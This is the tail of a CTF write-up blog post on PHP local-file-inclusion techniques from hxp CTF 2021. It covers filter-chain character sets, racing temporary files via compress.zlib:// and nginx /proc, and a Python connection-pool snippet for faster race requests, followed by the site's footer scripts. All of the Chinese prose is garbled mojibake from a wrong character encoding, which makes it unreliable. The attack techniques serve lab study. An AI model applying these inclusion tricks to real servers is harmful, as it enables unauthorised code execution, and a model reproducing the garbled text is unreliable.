<p>ä»¥åŠä¸€ä¸ªwupocå¸ˆå‚…fuzzå‡ºçš„å®Œæ•´å­—ç¬¦é›†<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></p>
<p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„æ–‡ç« æåˆ°äº†å’Œfilterç›¸å…³çš„å„ç§æ“ä½œã€‚æåˆ°äº†ä¸€ä¸ªæ–‡æ¡£ä¸­æ²¡æåˆ°çš„filter <code>consumed</code><br>åŠŸèƒ½å°±æ˜¯æŠŠè¯»å…¥ç›´æ¥å˜æˆä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œä¼¼ä¹åªåœ¨è¯»é“¾ä¸Šç”Ÿæ•ˆï¼Œå†™å…¥çš„æ—¶å€™æ²¡ç”¨ä½œç”¨ï¼Œé‚£ä¹ˆæ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.ambionics.io/blog/laravel-debug-rce">LARAVEL &lt;&#x3D; V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION</a></p>
<h4 id="å…¶ä»–çš„æ‚ä¸ƒæ‚å…«"><a href="#å…¶ä»–çš„æ‚ä¸ƒæ‚å…«" class="headerlink" title="å…¶ä»–çš„æ‚ä¸ƒæ‚å…«"></a>å…¶ä»–çš„æ‚ä¸ƒæ‚å…«</h4><p>PHPæ€ä¹ˆèƒ½è¯»nginxçš„procå‘¢ï¼Ÿå› ä¸ºPHPå’Œnginxæ˜¯åŒä¸€ä¸ªç”¨æˆ·éƒ¨ç½²çš„ï¼Œéƒ½æ˜¯www-dataï¼Œæ‰€ä»¥å°±æœ‰å¯¹åº”çš„æ–‡ä»¶æƒé™å’¯</p>
<p>counterä¹Ÿèƒ½ç”¨è¿™ä¸ªç«äº‰å»æ‰“ï¼Œä½†æ‰“èµ·æ¥éœ€è¦å†è¿›ä¸€æ­¥ï¼Œå†å¤šä¸€ä¸ªfile_put_contentsçš„ç«äº‰ï¼ŒåŒé‡ç«äº‰éš¾åº¦++ï¼Œç®€å•çš„è¯´å°±æ˜¯å¾—åŠ é’±ã€‚</p>
<p>è¿˜æœ‰ä¸€äº›åŠ å¼ºæ¡ä»¶ç«äº‰æˆåŠŸç‡çš„è¾…åŠ©æ‰‹æ®µï¼Œä¾‹å¦‚ä½¿ç”¨å¦‚ä¸‹ä»£ç åˆ›å»ºä¸€ä¸ªhttpè¿æ¥æ± ï¼Œå–æ¶ˆtcpä¸‰æ¬¡æ¡æ‰‹çš„æ—¶å»¶ï¼Œæ›´é«˜å¼ºåº¦çš„è¿›è¡Œç«äº‰</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">create_requests_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead</span>
    adapter <span class="token operator">=</span> requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>HTTPAdapter<span class="token punctuation">(</span>pool_connections<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> pool_maxsize<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>mount<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">,</span> adapter<span class="token punctuation">)</span>
    <span class="token keyword">return</span> session
</code></pre>
<p>ä»¥åŠä½¿ç”¨multiprocessingåº“å’Œthreadingåº“ï¼ŒåŒæ—¶å¤šå¼€è¿›ç¨‹å’Œçº¿ç¨‹ï¼Œæœ€å¤§ç¨‹åº¦ä¸Šå¾€å¤–ç‹‚å‘è¯·æ±‚ï¼Œä½¿ç”¨multiprocessingåº“å¥½åƒèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘pythonæœ¬èº«çš„GILï¼ˆå…¨å±€è§£é‡Šå™¨é”ï¼‰è™šå‡å¤šçº¿ç¨‹çš„å½±å“ï¼ˆå°è±¡é‡Œå¥½åƒå°±æ˜¯å¤šçº¿ç¨‹å…¶å®ä¹Ÿåªæœ‰é‚£ä¸ªæ‹¿åˆ°GILçš„çº¿ç¨‹èƒ½è·‘ï¼Œæ¯æ¬¡åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨CPUä¸Šæ‰§è¡Œï¼Œé¡¶å¤šå°±æ˜¯åˆ©ç”¨å¥½IOåˆ‡æ¢çš„æ—¶é—´ï¼Œèƒ½è·‘æ»¡ä¸€ä¸ªCPUï¼‰ï¼Œå¼€äº†è¿™ä¸ªå¤šè¿›ç¨‹ä¹‹åä¼¼ä¹æ˜¯æ¯ä¸ªCPUä¸Šå•ç‹¬èµ·ä¸€ä¸ªpythonè¿›ç¨‹ï¼Œå„è‡ªæœ‰å„è‡ªçš„GILï¼Œåæ­£å°±æ˜¯èƒ½æé«˜CPUåˆ©ç”¨ç‡å°±æ˜¯äº†ï¼Œåœ¨å¤šä¸ªCPUä¸Šå„è‡ªè¿›ç¨‹çš„çº¿ç¨‹ç–¯ç‹‚ä¸Šä¸‹ï¼Œè€Œä¸æ˜¯åªåœ¨ä¸€ä¸ªCPUä¸Šå‡ ä¸ªçº¿ç¨‹ç–¯ç‹‚ä¸Šä¸‹</p>
<p>è¿˜æœ‰ä¹‹å‰hxpctf2019å‡ºçš„includerçš„é¢˜è§£ï¼Œä½¿ç”¨<code>compress.zlib://</code>è¿™ä¸ªåè®®äº§ç”Ÿä¸´æ—¶æ–‡ä»¶ï¼ˆå°±å’Œä¸Šä¼ æ–‡ä»¶çš„äº§ç”Ÿä¸´æ—¶æ–‡ä»¶ç±»ä¼¼ï¼‰ï¼Œé…åˆnginxé”™è¯¯é…ç½®çš„ç›®å½•éå†è·å–ä¸´æ—¶æ–‡ä»¶å<br>è¿™é‡Œé¢åŒæ—¶ä¹Ÿä½¿ç”¨äº†æ‰‹å†™socketå¡ä½PHPæ‰§è¡Œï¼Œåˆ©ç”¨PHPè¾“å‡ºç¼“å†²åŒºå¤§å°é™åˆ¶ï¼Œé€šè¿‡è¾“å‡ºé•¿åº¦å¤§äºç¼“å†²åŒºå¼ºåˆ¶PHPåœ¨httpè¯·æ±‚æœªç»“æŸæ—¶æå‰å‘é€å›æ˜¾ç­‰æ“ä½œï¼Œè‡³äºé‚£ä¸ªä¸´æ—¶æ–‡ä»¶ä¸Šä¼ å¤šå°‘å†™å…¥å¤šå°‘ï¼Œå…ˆæ ¡éªŒå†ç»§ç»­ä¼ è¾“å†™å…¥åŒ…å«ï¼Œå¤šå¤šå°‘å°‘æœ‰ç‚¹ç„å¹»ï¼Œå¯èƒ½éœ€è¦é«˜å¼ºåº¦çœ‹æºç ï¼Œä½†éƒ½å¾ˆå€¼å¾—å­¦ä¹ <br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer">https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer</a></p>
<p>ä¸è¿‡è¯´åˆ°åº•ï¼ŒPHPæ–‡ä»¶åŒ…å«ä¸€èˆ¬æœ‰ä¸€ä¸ªè£¸åŒ…å«ï¼Œupload progressåŸºæœ¬ä¸Šå°±èƒ½æ‰“é€šäº†ï¼Œç”Ÿäº§ç¯å¢ƒä¹Ÿè®¸è¿˜èƒ½å†åŒ…å«ä¸€ä¸‹logä¹‹ç±»çš„ï¼Œæ„Ÿè§‰è¿™ç§åœ¨æé™é™åˆ¶ä¸‹çš„å¥‡æŠ€æ·«å·§æ„ä¹‰ä¸ä¸€å®šå¤§å•Š</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>å‡ºé¢˜äººçš„å®˜æ–¹é¢˜è§£<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a><br>pastençš„é¢˜è§£ï¼ˆè¯´èµ·æ¥è¿™ä¸ªè§£å°±æ˜¯é¢„æœŸè§£æ¥ç€ï¼‰<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">Winning the Impossible Race â€“ An Unintended Solution for Includerâ€™s Revenge &#x2F; Counter (hxp 2021)</a><br>zeddå¸ˆå‚…çš„åˆ†æ<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/wp/" rel="tag"># wp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/bytectf2021final%E5%A4%8D%E7%8E%B0.html" rel="prev" title="bytectf2021finalå¤ç°">
      <i class="fa fa-chevron-left"></i> bytectf2021finalå¤ç°
    </a></div>
      <div class="post-nav-item">
    <a href="/%5BRWCTF2021%5Dwp.html" rel="next" title="[RWCTF2021]wp">
      [RWCTF2021]wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hxpctf2021%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">hxpctf2021å¤ç°</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Log-4-sanity-check"><span class="nav-number">1.1.</span> <span class="nav-text">Log 4 sanity check</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%B6%E6%9E%81dockerfile"><span class="nav-number">1.1.1.</span> <span class="nav-text">ç©¶ædockerfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.2.</span> <span class="nav-text">é¢˜è§£</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shitty-blog"><span class="nav-number">1.2.</span> <span class="nav-text">shitty blog</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.2.1.</span> <span class="nav-text">å‘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unzipper"><span class="nav-number">1.3.</span> <span class="nav-text">unzipper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#counter"><span class="nav-number">1.4.</span> <span class="nav-text">counter</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="nav-number">1.4.1.</span> <span class="nav-text">å¯èƒ½çš„æ€è·¯ï¼Ÿ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">1.4.2.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#includer%E2%80%99s-revenge"><span class="nav-number">1.5.</span> <span class="nav-text">includerâ€™s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#update-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">update</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%BE%E7%82%B91"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">éš¾ç‚¹1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%BE%E7%82%B92"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">éš¾ç‚¹2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%98%E6%96%B9%E7%BB%95%E8%BF%87%E8%BD%AF%E9%93%BE%E6%8E%A5%E6%96%B9%E6%A1%88"><span class="nav-number">1.5.1.2.1.</span> <span class="nav-text">å®˜æ–¹ç»•è¿‡è½¯é“¾æ¥æ–¹æ¡ˆ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%A6%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">1.5.1.2.2.</span> <span class="nav-text">å­¦ä¸€äº›å…¶ä»–çš„æ“ä½œ</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LFI%E7%9A%84%E6%9C%80%E7%BB%88%E9%80%9A%E6%9D%80"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">LFIçš„æœ€ç»ˆé€šæ€</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">å…¶ä»–çš„æ‚ä¸ƒæ‚å…«</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">å‚è€ƒé“¾æ¥</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
  <p class="site-author-name" itemprop="name">Z3ratu1</p>
  <div class="site-description" itemprop="description">ä¸å…¶æ„Ÿæ…¨è·¯éš¾è¡Œï¼Œä¸å¦‚ç°åœ¨å‡ºå‘</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">190</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">94</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 â€“ 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
